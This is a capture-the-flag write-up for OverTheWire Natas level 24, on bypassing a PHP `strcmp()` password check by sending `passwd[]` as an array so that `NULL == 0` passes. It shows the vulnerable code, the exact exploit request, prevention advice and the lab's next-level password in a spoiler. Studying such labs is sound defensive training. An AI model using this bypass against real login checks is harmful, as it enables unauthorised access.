# Natas Level 24 → 25

## Objective

Retrieve the password for the next level by exploiting improper input validation in PHP.

The application compares the supplied password using `strcmp()`, assuming the input is always a string.

By sending an array instead of a string, the comparison can be bypassed due to PHP's loose type handling (on vulnerable PHP versions).

---

## Enumeration

* Logged into the application.
* Reviewed the webpage.
* Viewed the source code.
* Found that the application checks the `passwd` parameter.
* Observed that the password is validated using `strcmp()`.

---

# Source Code Analysis

The application first checks whether the `passwd` parameter exists.

```php
if(array_key_exists("passwd", $_REQUEST)){
```

Then it compares the supplied password.

```php
if(strcmp($_REQUEST["passwd"], "<secret>") == 0){
    echo "The credentials for the next level are...";
}
```

The developer expects `$_REQUEST["passwd"]` to always be a string.

---

## Understanding `strcmp()`

`strcmp()` compares two strings.

Syntax:

```php
strcmp(string1, string2)
```

Return values:

| Return Value | Meaning                 |
| ------------ | ----------------------- |
| `0`          | Strings are identical   |
| `< 0`        | First string is smaller |
| `> 0`        | First string is greater |

Example:

```php
strcmp("hello", "hello");
```

Returns:

```text
0
```

---

# Vulnerability

## Improper Input Validation

The application never verifies that `passwd` is actually a string.

Instead of sending:

```text
?passwd=test
```

an attacker can send:

```text
?passwd[]=test
```

PHP parses this as:

```php
$_REQUEST["passwd"] = array("test");
```

The application now executes:

```php
strcmp(array("test"), "<secret>");
```

---

## PHP Behavior

`strcmp()` expects strings.

Passing an array generates a warning.

Example:

```php
strcmp(array("test"), "secret");
```

Produces:

```text
Warning: strcmp() expects parameter 1 to be string, array given
```

and returns:

```php
NULL
```

---

## Loose Comparison

The application compares:

```php
strcmp(...) == 0
```

Since `strcmp()` returned:

```php
NULL
```

the comparison becomes:

```php
NULL == 0
```

Using PHP's loose comparison rules:

```text
NULL == 0
```

evaluates to:

```text
True
```

The condition succeeds even though the password is incorrect.

---

# Exploitation Strategy

Instead of supplying a string, submit an array.

Request:

```http
GET /?passwd[]=test HTTP/1.1
Host: natas24.natas.labs.overthewire.org
```

PHP interprets:

```php
$_REQUEST["passwd"]
```

as:

```php
array(
    0 => "test"
)
```

The application executes:

```php
strcmp(array("test"), "<secret>")
```

↓

```php
NULL
```

↓

```php
NULL == 0
```

↓

```text
True
```

The next level password is revealed.

---

# Attack Flow

```
Open Website
      |
      v
Review Source Code
      |
      v
Find strcmp()
      |
      v
Notice Missing Type Validation
      |
      v
Send Array Instead of String
      |
      v
strcmp(array, string)
      |
      v
Returns NULL
      |
      v
NULL == 0
      |
      v
Condition Becomes True
      |
      v
Retrieve Next Password
```

---

# Result

The password was successfully retrieved by abusing PHP's loose comparison and improper input validation.

The application assumed the user would always provide a string, allowing an attacker to bypass authentication by supplying an array.

---

# Prevention

Always validate the input type before calling string functions.

Example:

```php
if(!is_string($_REQUEST["passwd"])){
    die("Invalid input");
}
```

Use strict comparison:

```php
if(strcmp($_REQUEST["passwd"], $password) === 0){
    // Success
}
```

Additional recommendations:

* Validate all user input.
* Never assume request parameters are strings.
* Use strict comparisons (`===`) whenever possible.
* Handle errors instead of relying on implicit type conversions.

---

# Key Takeaways

* `strcmp()` expects string arguments.
* PHP request parameters can be submitted as arrays.
* Improper input validation can bypass authentication.
* Loose comparison (`==`) is dangerous when functions may return unexpected values.
* Validate data types before performing comparisons.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas25
Password : UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
```

</details>
